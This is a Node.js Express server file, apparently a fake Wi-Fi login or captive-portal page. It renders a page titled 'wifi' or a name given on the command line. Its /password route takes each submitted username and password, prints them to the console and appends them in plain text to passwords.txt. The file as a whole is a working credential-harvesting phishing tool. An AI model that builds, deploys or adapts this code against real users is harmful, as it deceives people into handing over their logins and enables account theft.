// https://www.raddy.dev/blog/nodejs-setup-with-html-css-js-ejs/


// Imports
const express = require('express')
const app = express()
const port = 8080

// Working with files
const fs = require('fs');
const https = require('https');

// The option to pull the password from the body of the POST request
const BodyParser = require('body-parser')
app.use(BodyParser.urlencoded({extended: true}))

// Static Files
app.use(express.static('public'));

// Example for other olders
app.use('/css', express.static(__dirname + 'public/css'))
app.use('/js', express.static(__dirname + 'public/js'))
app.use('/img', express.static(__dirname + 'public/img'))

const key = fs.readFileSync('./key.pem');
const cert = fs.readFileSync('./cert.pem');
const server = https.createServer({key: key, cert: cert }, app);

// Set View's
app.set('views', './views');
app.set('view engine', 'ejs');
var args = process.argv.slice(2);

app.get('', (req, res)=>{
    res.status(301).render('index', {title: args[0]});
});

app.post('/password', (req, res)=>{
    const password = req.body.password;
    const username = req.body.username;
    console.log(req.body);
    console.log(password, username);
    fs.appendFileSync('passwords.txt', `user name: ${username}, password : ${password} \n`);
    fs.appendFileSync('passwords.txt', `\n#############################################\n\n`);
    res.status(301).render('index', {title: 'wifi'});
});


// Listen on Port 5000
server.listen(port, () => console.info(`App listening on port ${port}`))